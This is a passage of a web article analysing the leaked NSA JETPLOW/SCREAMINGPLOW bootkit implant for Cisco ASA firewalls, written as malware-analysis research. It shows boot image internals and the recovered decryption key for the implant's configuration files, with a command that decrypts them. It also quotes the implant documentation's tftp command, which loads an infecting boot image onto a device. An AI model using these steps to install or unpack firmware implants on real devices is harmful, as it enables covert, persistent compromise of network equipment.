<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>JETPLOW Architecture - NSA backdoor in my coffee stand</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="‚ÄúWhat an elegant move is to call a standard bootkit an implant,‚Äù we thought. 

 It all started about a year ago, when our research department received...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>JETPLOW Architecture - NSA backdoor in my coffee stand</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/files/2b7/1cb/793/2b71cb7934f44ed688471d3f2ef9b699.jpg" alt="Picture to attract attention"></p><br><blockquote>  ‚ÄúWhat an elegant move is to call a standard bootkit an implant,‚Äù we thought. </blockquote><p>  It all started about a year ago, when our research department received expensive coffee stands, namely a few pieces of hardware from Cisco - Catalyst 3850, Catalyst 6500 switches (a technique for writing shellcodes for this "beast" was previously a report on <a href="http://2015.zeronights.ru/assets/files/05-Nosenko.pdf">ZeroNights 2015</a> ) and inter-network ASA 5525-X screen. </p><br><p>  Having found several bugs in the firewall that allowed us to ‚Äúfall through‚Äù to the system, having received a standard shell (the developer was promptly informed), we thought about the impact - what can be done so terrible that would cause maximum damage.  And here ... the <a href="https://www.eff.org/files/2014/01/06/20131230-appelbaum-nsa_ant_catalog.pdf">secret documents of the NSA</a> merged in Snowden in 2013 came at an opportune moment.  They talked about an implant for PIX and ASA called <a href="">JETPLOW</a> , covering the Cisco PIX 500 series and the Cisco ASA 5505, 5510, 5520, 5540, 5550 series. As you can see, there were no supported versions in the NSA catalog the mention of the available ASA 5525-X, which, in turn, gave rise to sports interest in the creation of its implant under the 5525-X series as a PoC. </p><br><p>  We will talk about our vision and implementation of the implant under ASA 5525-X at the <a href="http://2016.zeronights.ru/">ZeroNights 2016</a> conference and post its source codes.  Also, as a bonus, we will demonstrate the implementation of a similar implant for the Catalyst 3850. </p><br><p>  It is important to note that the developed implant for the target 5525-X is slightly different from <em>JETPLOW</em> due to the fact that the 5525-X is built on the Intel x86_64 architecture and uses UEFI, while the Catalyst 3850 is based on the MIPS64 architecture. </p><a name="habracut"></a><br><h2>  Archive from The Shadow Brokers </h2><br><p> Since the publication, there have been many articles devoted to analyzing the contents of the free part of the archive ( <a href="http://blogs.cisco.com/security/shadow-brokers">link 1</a> , <a href="https://musalbas.com/2016/08/16/equation-group-firewall-operations-catalogue.html">link 2</a> ).  Someone went into conspiracy, associating the constant value of <code>Q32</code> with the Equation Group, someone just waved it off, recklessly saying that the exploiters were able to hit only the old versions of ASA and did not pose any threat. </p><br><p>  In this paper, we propose to abstract from undercover bulldog games, not to figure out who hacked someone and who suspects who, and based on our experience in reverse engineering of Cisco equipment (and other similar hardware), as well as analyzing malicious code, carry out cold-blooded technical analysis of the implant itself (see the <em>BANANAGLEE /</em> directory), intended for the equipment of this vendor.  After all, the fact remains that the files presented in the archive are really a set of exploitation tools for previously unpublished vulnerabilities and tools for secretly retrieving information using bootkit technology.  Despite the lack of part of the files, the tools in the archive work fine and perform their task.  It is impossible not to admire the amount of work done. </p><br><p>  Before you go directly to the analysis of the implant, it is worth considering the target hardware on which it is installed, namely the architecture of firewalls from Cisco. </p><br><h2>  What is a firewall from Cisco </h2><br><h3>  ASA and PIX </h3><br><p>  Cisco's ecosystem is huge, simply amazing.  Only widely known operating systems have a dozen of them: </p><br><ul><li>  Ios </li><li>  Ios xe </li><li>  Ios xr </li><li>  NX-OS </li><li>  CatOS </li><li>  AsyncOS </li><li>  Firepower os </li><li>  OS AireOS </li><li>  NX OS </li><li>  OS PIX </li><li>  ASA OS </li><li>  ... </li></ul><br><p>  Some are based on Linux, others on QNX or BSDi, you can also find other proprietary operating systems.  In general, a real zoo, and how a producer manages it (or does not manage it), remains a mystery.  And do not forget that it still works on various architectures: </p><br><ul><li>  x86 </li><li>  x86_64 </li><li>  ARM </li><li>  Mips </li><li>  PowerPC </li><li>  ... </li></ul><br><p>  The output is a very difficult matrix of device types.  It should be understood that the processor architecture depends on what security technologies are at the processor level, and can be used to protect the device.  Protection technologies may not be a priori on the device due to hardware stuffing.  So you need to carefully study what is used in the bowels of the device. </p><br><p>  Today we will consider two lines of hardware firewalls: PIX (Private Internet Exchange) and ASA (Adaptive Security Appliance), which came to replace the PIX.  Both glands have x86 (Intel and AMD) compatible architecture. </p><br><h3>  Firewall Download </h3><br><p>  Like most devices from Cisco, in firewalls the boot task is performed by some bootstrap code, called <em>ROMMON</em> (ROM Monitor).  <em>ROMMON</em> at the very beginning of its work performs the tasks of initializing hardware components, and then reads the current configuration from <em>NVRAM</em> .  If there is no need to switch to <em>ROM Monitor mode</em> (confreg 0x00), it uses <em>GRUB</em> to load the image (boot image with the <em>.bin</em> extension) of the operating system, for which it sends it the name of the file read from <em>NVRAM</em> . </p><br><p>  The ASA / PIX boot process looks like this: </p><br><p><img src="https://habrastorage.org/files/822/6b6/dc3/8226b6dc3f6049218c2761f602fdb969.png" alt="ASA / PIX firewall boot process data flow"></p><br><p>  The ASA and PIX boot image is a file that is stored on a flash drive, better known to us as <em>flash: /</em> .  The structure of boot images looks like this: </p><br><p><img src="https://habrastorage.org/files/456/d12/786/456d127863f347f28063e19cc9b584bd.png" alt="General structure of ASA and PIX boot images"></p><br><p>  The evolution of ASA images is visible in the fact that, starting with version 8.xx, Cisco has switched to using Linux.  Further, as an example, consider the contents of the bootable <em>asa831-k8.bin</em> (below we will comment on why this image was chosen): </p><br><pre> <code class="hljs javascript">$ binwalk -B asa831-k8.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0x0</span></span> Cisco ASA MAINLDR <span class="hljs-number"><span class="hljs-number">512</span></span> <span class="hljs-number"><span class="hljs-number">0x200</span></span> Cisco ASA NEXTLDR, <span class="hljs-attr"><span class="hljs-attr">a_text</span></span>: <span class="hljs-number"><span class="hljs-number">0x1000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_data</span></span>: <span class="hljs-number"><span class="hljs-number">0x1000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_bss</span></span>: <span class="hljs-number"><span class="hljs-number">0x0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_syms</span></span>: <span class="hljs-number"><span class="hljs-number">0x3C0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_entry</span></span>: <span class="hljs-number"><span class="hljs-number">0xA000</span></span> <span class="hljs-number"><span class="hljs-number">18432</span></span> <span class="hljs-number"><span class="hljs-number">0x4800</span></span> Cisco ASA NEXTLDR, <span class="hljs-attr"><span class="hljs-attr">a_text</span></span>: <span class="hljs-number"><span class="hljs-number">0x7000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_data</span></span>: <span class="hljs-number"><span class="hljs-number">0x1000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_bss</span></span>: <span class="hljs-number"><span class="hljs-number">0x0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_syms</span></span>: <span class="hljs-number"><span class="hljs-number">0x0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_entry</span></span>: <span class="hljs-number"><span class="hljs-number">0x14000</span></span> <span class="hljs-number"><span class="hljs-number">20682</span></span> <span class="hljs-number"><span class="hljs-number">0x50CA</span></span> Unix path: <span class="hljs-regexp"><span class="hljs-regexp">/platform/</span></span>asa/finesse/pci.c <span class="hljs-number"><span class="hljs-number">73728</span></span> <span class="hljs-number"><span class="hljs-number">0x12000</span></span> Cisco ASA BOOTLDR, <span class="hljs-attr"><span class="hljs-attr">a_text</span></span>: <span class="hljs-number"><span class="hljs-number">0x5000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_data</span></span>: <span class="hljs-number"><span class="hljs-number">0xF19000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_bss</span></span>: <span class="hljs-number"><span class="hljs-number">0x0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_syms</span></span>: <span class="hljs-number"><span class="hljs-number">0x24</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_entry</span></span>: <span class="hljs-number"><span class="hljs-number">0x100020</span></span> <span class="hljs-number"><span class="hljs-number">79802</span></span> <span class="hljs-number"><span class="hljs-number">0x137BA</span></span> Unix path: <span class="hljs-regexp"><span class="hljs-regexp">/platform/</span></span>asa/finesse/pci.c <span class="hljs-number"><span class="hljs-number">94208</span></span> <span class="hljs-number"><span class="hljs-number">0x17000</span></span> Cisco ASA vmlinuz (<span class="hljs-number"><span class="hljs-number">2.6</span></span>.x), <span class="hljs-attr"><span class="hljs-attr">kernel_alignment</span></span>: <span class="hljs-number"><span class="hljs-number">0x100000</span></span> <span class="hljs-number"><span class="hljs-number">106110</span></span> <span class="hljs-number"><span class="hljs-number">0x19E7E</span></span> gzip compressed data, maximum compression, <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> Unix, last modified: <span class="hljs-number"><span class="hljs-number">2010</span></span><span class="hljs-number"><span class="hljs-number">-03</span></span><span class="hljs-number"><span class="hljs-number">-04</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">10</span></span> <span class="hljs-number"><span class="hljs-number">1432976</span></span> <span class="hljs-number"><span class="hljs-number">0x15DD90</span></span> gzip compressed data, has original file name: <span class="hljs-string"><span class="hljs-string">"rootfs.img"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> Unix, last modified: <span class="hljs-number"><span class="hljs-number">2010</span></span><span class="hljs-number"><span class="hljs-number">-03</span></span><span class="hljs-number"><span class="hljs-number">-04</span></span> <span class="hljs-number"><span class="hljs-number">23</span></span>:<span class="hljs-number"><span class="hljs-number">57</span></span>:<span class="hljs-number"><span class="hljs-number">08</span></span> <span class="hljs-number"><span class="hljs-number">15454677</span></span> <span class="hljs-number"><span class="hljs-number">0xEBD1D5</span></span> Zip archive data, at least v2<span class="hljs-number"><span class="hljs-number">.0</span></span> to extract, <span class="hljs-attr"><span class="hljs-attr">name</span></span>: com/cisco/webvpn/csvrelay64.dll <span class="hljs-number"><span class="hljs-number">15881408</span></span> <span class="hljs-number"><span class="hljs-number">0xF254C0</span></span> Cisco ASA STUBLDR, <span class="hljs-attr"><span class="hljs-attr">a_text</span></span>: <span class="hljs-number"><span class="hljs-number">0x6000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_data</span></span>: <span class="hljs-number"><span class="hljs-number">0x1000</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_bss</span></span>: <span class="hljs-number"><span class="hljs-number">0x0</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_syms</span></span>: <span class="hljs-number"><span class="hljs-number">0x1FA4</span></span>, <span class="hljs-attr"><span class="hljs-attr">a_entry</span></span>: <span class="hljs-number"><span class="hljs-number">0x14000</span></span>, kernel-size: <span class="hljs-number"><span class="hljs-number">0x146D90</span></span>, rootfs-size: <span class="hljs-number"><span class="hljs-number">0xDC7718</span></span> <span class="hljs-number"><span class="hljs-number">15887378</span></span> <span class="hljs-number"><span class="hljs-number">0xF26C12</span></span> Unix path: <span class="hljs-regexp"><span class="hljs-regexp">/platform/</span></span>asa/finesse/pci.c</code> </pre> <br><p>  <em>Having unpacked rootfs</em> , you can select several interesting features: </p><br><ol><li>  Kernel used: <em>Linux version 2.6.29.6 (builders @ ff-bldcheck-05) (gcc version 4.0.2) # 1 PREEMPT Thu Mar 4 15:59:06 MST 2010</em> . </li><li>  The directory containing the firewall files: <em>/ tmp / asa831-k8-rootfs / asa</em> . </li><li>  The main executable file has the path <em>/ tmp / asa831-k8-rootfs / asa / bin / lina</em> and is executed as <em>root</em> . </li><li>  Forced shutdown of ASLR (we will look at how implant developers are using it): </li></ol><br><pre> <code class="hljs ruby">$ grep <span class="hljs-string"><span class="hljs-string">"randomize_va_space"</span></span> /tmp/asa831-k8-rootfs/asa/scripts/rcS.common echo <span class="hljs-number"><span class="hljs-number">0</span></span> &gt; <span class="hljs-regexp"><span class="hljs-regexp">/proc/sys</span></span><span class="hljs-regexp"><span class="hljs-regexp">/kernel/randomize</span></span>_va_space</code> </pre> <br><h4>  Boot image components and boot sequence </h4><br><p>  It makes no sense to consider the <em>MBR</em> and <em>FirstLdr</em> , since they do not participate in the download and are rudiments stretching from the versions of the images under the PIX. </p><br><p>  All loaders, except for the <em>MBR</em> , have headers described by the following <a href="">structure</a> (only the value of the <em>a_midmag</em> field is <em>different</em> ): </p><br><pre> <code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">grub_aout32_header</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_midmag; <span class="hljs-comment"><span class="hljs-comment">/* htonl(flags&lt;&lt;26 | mid&lt;&lt;16 | magic) */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_text; <span class="hljs-comment"><span class="hljs-comment">/* text segment size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_data; <span class="hljs-comment"><span class="hljs-comment">/* initialized data size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_bss; <span class="hljs-comment"><span class="hljs-comment">/* uninitialized data size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_syms; <span class="hljs-comment"><span class="hljs-comment">/* symbol table size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_entry; <span class="hljs-comment"><span class="hljs-comment">/* entry point */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_trsize; <span class="hljs-comment"><span class="hljs-comment">/* text relocation size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">grub_uint32_t</span></span> a_drsize; <span class="hljs-comment"><span class="hljs-comment">/* data relocation size */</span></span> };</code> </pre> <br><h5>  Secondldr </h5><br><p>  It has a signature (the value of the <em>a_midmag</em> field): <em>0x0064010B</em> . </p><br><p>  If you do not go into details of the work of this bootloader, then you can say that it is used only when <em>ROMMON</em> downloads an image using the <em>tftp</em> protocol.  <em>ROMMON</em> positions the loadable image in physical memory, taking into account the <em>SecondLdr</em> offset and its header at <em>0x13FE0</em> , and transfers control to it <strong>(1 *)</strong> .  The main task of this loader is to check the integrity of the loaded image, check the support of the target platform, relocate the rest of the image, starting with <em>BootLdr</em> at <em>0x100000</em> and transfer control to its entry point <strong>(2 *)</strong> . </p><br><h5>  Bootldr </h5><br><p>  This bootloader has a signature of <em>0x107</em> , the main task is to prepare the kernel for launch, re-check support of the target platform, generate the platform identifier, <em>relocate the StubLdr</em> body at <em>0x13FE0</em> (including the header) and transfer control to it <strong>(2)</strong> .  A pointer to the calculated platform identifier is passed as an argument. </p><br><p>  Also, this bootloader can transfer control to GRUB <strong>(1)</strong> , which, in principle, does not affect its download address. </p><br><h5>  StubLdr </h5><br><p>  It has a signature of <em>0x0064010B</em> , the main task of this bootloader is unpacking and loading the kernel <strong>(3)</strong> . </p><br><p>  It is important to note that in the case of an image under PIX (starting with version 6.2 of the images), the kernel has a header similar to the <em>BootLdr</em> loader. </p><br><h2>  JETPLOW </h2><br><p>  As for terminology, when analyzing the archive, we noticed that the name <em>JETPLOW is</em> used to denote early versions of the implant (mainly for PIX), and the new versions are given the name <em>SCREAMINGPLOW</em> , while some of the control components of the latest versions have partial support for old versions . </p><br><p>  <strong>We analyzed the latest version of the <em>BannanaDaiquiri</em> 3.1.2 <em>toolkit</em> (the <em>BANANAGLEE / BG3121 directory</em> ) and its <em>ScreamingPlow</em> version 2.8 ( <em>SCP28</em> ).</strong>  <strong>The Cisco ASA 5505 firewall with <em>ROMMON</em> version 1.0 (12) 13 and the boot image of version 8.3.1 (asa831-k8.bin) were selected as the target equipment.</strong>  <strong>We took the latest version of the implant because it contains support for a larger number of series of target firewalls, an expanded set of features and an improved architecture.</strong> </p><br><h3>  Ways of infection </h3><br><p>  Implant installation is possible: </p><br><ul><li>  through post-operation, for example, after remote exploitation of a vulnerability.  Such an exploit can also be found in the archived archive (see <em>EXPLOITS / EXBA</em> ); </li><li>  through the use of the boot image.  Such an infection can be made remotely over the network or with physical access to the device.  For example, in the office of the transport company. </li></ul><br><p>  Some of the interesting information can be gathered from the developers documentation (for example, see the file <em>screamplow-INSTALL.txt</em> ), written in a sarcastic form. </p><br><p>  It mentions a key (engineering) boot image <em>image.bin</em> , which is not in the archive, and is downloaded via the network using the tftp, ftp and http (s) protocols. </p><br><p>  Example from documentation: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">copy</span></span> tftp://[workstation IP]/image.bin flash:/image2.bin boot system image2.bin rel</code> </pre> <br><p>  In case of infection of earlier firewall series, namely PIX, developers carefully provide the operator with deployment automation scripts for the Apache web server (see the <em>OPS / apache_setup.sh</em> file and the <em>SCRIPTS / Apache_Setup.txt documentation</em> ) for the subsequent downloading of engineering images using the http protocol ( s). </p><br><p><img src="https://habrastorage.org/files/cae/c3b/60c/caec3b60cd964c9599cb02c16c6378cb.png" alt="The process of using an image to infect"></p><br><p>  This engineering image must be individually generated for a specific target firewall based on some basic information about it (series, <em>ROMMON</em> version, etc.).  In addition, when generating an image, an implant ID must be specified, which will later be used to identify and communicate with infected devices. </p><br><p>  All interaction with the engineering image is carried out over the network (UDP 500).  Several utilities are used for this: </p><br><ul><li>  infector (in recent versions it has the name <em>BPICKER</em> , in older versions it is <em>writeScreamingPlow</em> and <em>writeJetPlow</em> ); </li><li>  <em>LP</em> utility for monitoring and subsequent management. </li></ul><br><p>  The main objective of the infector is to generate a BIOS Flash image map, taking into account the information received about the system, and transfer the generated data to the utilities on the boot image for subsequent infection. </p><br><h3>  Preparation for infection </h3><br><p>  As mentioned earlier, the latest version of the <em>BannanaDaiquiri</em> utilities <em>uses the BPICKER</em> utility to generate the BIOS Flash image card (see the <em>BANANAGLEE / BG3121 / Install / LP / BPICKER-3100 file</em> ).  This utility, after connecting to the engineering image, receives information about the target equipment from it.  Then, on its basis, an archive with the name <code>&lt;platform_name&gt;-moduledata-&lt;bg_version&gt;.tgz</code> , which contains the components of the implant, is searched in the current directory.  Unfortunately, in the published part of the archive there is only the <em>asa-moduledata-3101.tgz file</em> .  Having unpacked the archive, you can observe the following directory structure: </p><br><pre> <code class="hljs sql">$ tree -d BANANAGLEE/BG3121/<span class="hljs-keyword"><span class="hljs-keyword">Install</span></span>/LP/asa-moduledata<span class="hljs-number"><span class="hljs-number">-3101</span></span> asa-moduledata<span class="hljs-number"><span class="hljs-number">-3101</span></span> ‚îú‚îÄ‚îÄ asa <span class="hljs-comment"><span class="hljs-comment">#  xml-   pif (persistence information file),    BIOS Flash ‚îÇ  ‚îî‚îÄ‚îÄ legacy ‚îú‚îÄ‚îÄ bin #     ScreamingPlow    ASA5505  ASAGen ‚îÇ  ‚îú‚îÄ‚îÄ asa5505 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ legacy ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP10 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP20 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP21 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP23 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP24 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP25 ‚îÇ  ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP26 ‚îÇ  ‚îÇ  ‚îÇ  ‚îî‚îÄ‚îÄ SCP27 ‚îÇ  ‚îÇ  ‚îî‚îÄ‚îÄ SCP28 ‚îÇ  ‚îî‚îÄ‚îÄ asaGen ‚îÇ  ‚îú‚îÄ‚îÄ legacy ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP10 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP20 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP21 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP23 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP24 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP25 ‚îÇ  ‚îÇ  ‚îú‚îÄ‚îÄ SCP26 ‚îÇ  ‚îÇ  ‚îî‚îÄ‚îÄ SCP27 ‚îÇ  ‚îî‚îÄ‚îÄ SCP28 ‚îî‚îÄ‚îÄ lib #  ,        </span></span></code> </pre> <br><p>  For the implant version we have chosen, the file containing the flash BIOS image maps is named <em>asa / asa5505_101213_install_SCP28.pif</em> .  The key for decrypting pif-files can be found through the analysis of the utility <em>BPICKER</em> . </p><br><pre> <code class="hljs markdown">// <span class="hljs-code"><span class="hljs-code">`BANANAGLEE/BG3121/Install/LP/BPICKER-3100`</span></span> @ 0804F080 uint8<span class="hljs-emphasis"><span class="hljs-emphasis">_t *key = (uint8_</span></span>t <span class="hljs-emphasis"><span class="hljs-emphasis">*)malloc(29); *</span></span>(uint32<span class="hljs-emphasis"><span class="hljs-emphasis">_t *)key = 0xC28AD3C7; *((uint32_</span></span>t <span class="hljs-emphasis"><span class="hljs-emphasis">*)key + 1) = 0xD8CFDCC5; *</span></span>((uint32<span class="hljs-emphasis"><span class="hljs-emphasis">_t *)key + 2) = 0xCCCBD8C9; *((uint32_</span></span>t <span class="hljs-emphasis"><span class="hljs-emphasis">*)key + 3) = 0xD9C38ADE; *</span></span>((uint32<span class="hljs-emphasis"><span class="hljs-emphasis">_t *)key + 4) = 0xC6DFCC8A; *((uint32_</span></span>t <span class="hljs-emphasis"><span class="hljs-emphasis">*)key + 5) = 0xCCC58AC6; *</span></span>((uint32_t *)key + 6) = 0xC6CFCF8A; key[28] = 0xD9; int i = 0; do { key[i] ^= 0xAA; ++i; } while (i <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">=</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">28</span></span></span></span><span class="xml"><span class="hljs-tag">); // </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">key</span></span></span></span><span class="xml"><span class="hljs-tag"> = </span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"my hovercraft is full of eels"</span></span></span></span></span></span></code> </pre> <br><p>  For our chosen version of the implant, we are interested in pif-files named <em>asa / asa5505_101213_install_SCP28.pif</em> for installation and <em>asa / asa5505_101213_uninstall_SCP28.pif</em> for uninstallation. </p><br><p>  You can decrypt all the pif files in the archive as follows: </p><br><pre> <code class="hljs swift"><span class="hljs-built_in"><span class="hljs-built_in">find</span></span> . -iname <span class="hljs-string"><span class="hljs-string">"*.pif"</span></span> -type f -<span class="hljs-built_in"><span class="hljs-built_in">print</span></span> -exec sh -<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> 'openssl base64 -d -<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> {} | openssl aes-<span class="hljs-number"><span class="hljs-number">128</span></span>-cbc -d -nosalt -md md5 -k <span class="hljs-string"><span class="hljs-string">"my hovercraft is full of eels"</span></span> &gt; {}.xml' \;</code> </pre> <br><p>  The <em>decrypted</em> xml file <em>asa5505_101213_install_SCP28.pif</em> contains the following: </p><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">platform</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:noNamespaceSchemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"versionFile.xsd"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">lib</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"libasa.so"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">name</span></span></span><span class="hljs-tag">&gt;</span></span>asa5505<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">name</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">version</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">name</span></span></span><span class="hljs-tag">&gt;</span></span>1.0(12)13 (no persistence detected)<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">name</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">originalBios</span></span></span><span class="hljs-tag">&gt;</span></span>bin/asa5505/asa5505_101213_bios_sectors1-E_clean.bin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">originalBios</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signatureList</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-comment"><span class="hljs-comment">&lt;!-- Clean Signatures --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Sectors 6-7 --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>67dfd19f3eb3649d6f3f6631e44d0bd36b8d8d19<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff60000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0x20000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span 